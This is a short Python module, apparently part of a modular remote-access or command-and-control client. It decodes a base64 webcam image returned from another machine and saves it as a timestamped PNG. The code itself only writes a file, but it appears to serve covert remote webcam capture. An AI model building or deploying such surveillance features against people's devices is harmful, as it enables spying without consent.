import os
import base64
import time
from apps.client.modules.libs.mod_client_interface import mod_client_interface


class mod_client_webcam(mod_client_interface):
    def setup_mod(self):
        print(f'Module Setup (mod_client_webcam) called successfully!')

    def get_datetime_str(self):
        return time.strftime("%Y%m%d-%H%M%S")

    def run_mod(self, message):
        result = super(mod_client_webcam, self).run_mod(message)
        cur_dir = os.path.abspath("./tmp")
        print("CurDir: " + cur_dir)
        base64ToolContent = result
        base64ToolContent = base64ToolContent.encode()

        image_out = f"{cur_dir}/webcam-{self.get_datetime_str()}.png"
        with open(image_out, "wb") as output_file:
            output_file.write(base64.b64decode(base64ToolContent))
        return f"Webcam snapshot saved to: {image_out}"
